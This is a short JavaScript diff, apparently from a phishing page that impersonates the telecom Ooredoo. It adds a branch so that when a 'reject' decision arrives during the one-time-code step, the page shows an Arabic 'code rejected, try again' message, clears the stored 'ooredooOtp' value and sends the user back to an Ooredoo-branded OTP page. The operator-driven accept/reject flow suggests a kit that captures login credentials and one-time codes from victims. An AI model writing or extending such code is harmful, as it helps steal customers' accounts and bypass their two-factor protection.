@@ -185,6 +185,18 @@
     }
 
     if (decision === 'reject') {
+      if (flow === 'otp') {
+        const otpError = 'تم رفض الرمز. حاول مرة أخرى';
+        sessionStorage.setItem('otpError', otpError);
+        localStorage.setItem('otpError', otpError);
+        sessionStorage.removeItem('ooredooOtp');
+        localStorage.removeItem('ooredooOtp');
+        localStorage.setItem(flowKey, 'otp');
+        sessionStorage.setItem(flowKey, 'otp');
+        window.location.href = 'otp_ooredoo.html';
+        return;
+      }
+
       sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
       localStorage.removeItem(decisionKey);
       sessionStorage.removeItem(decisionKey);
